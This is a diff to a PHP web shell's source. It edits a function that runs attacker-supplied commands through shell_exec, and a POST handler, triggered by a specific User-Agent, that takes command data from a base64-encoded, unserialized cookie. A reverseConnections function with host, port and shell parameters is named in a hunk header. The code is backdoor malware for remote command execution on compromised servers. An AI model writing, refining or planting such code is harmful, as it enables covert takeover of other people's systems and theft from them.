@@ -301,9 +301,9 @@ function reverseConnections($methods, $host, $port, $shell)
 function executeCommands(string $com, int $run)
 {
     if (!empty($com) && $run === "1") {
-        echo("~ Info To Remember ~ \n" . shell_exec(base64_decode($com)));
+        echo("~ Info To Remember ~ \n" . shell_exec($com));
     } else {
-        echo("\nExecuting: " . base64_decode($com) . "\n" . shell_exec(base64_decode($com)));
+        echo("\nExecuting: " . $com . "\n" . shell_exec($com));
     }
 }
 
@@ -359,7 +359,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         $ct = null;
         $split = null;
         if ($_POST['cr'] === "1") {
-            $split = unserialize(base64_decode($_COOKIE['cx']), ["allowed_classes"=>false]);
+            $split = base64_decode(unserialize(base64_decode($_COOKIE['cx']), ["allowed_classes"=>false]));
         } else {
             $s = $_COOKIE['cx'];
             $v = explode(".", base64_decode($s));
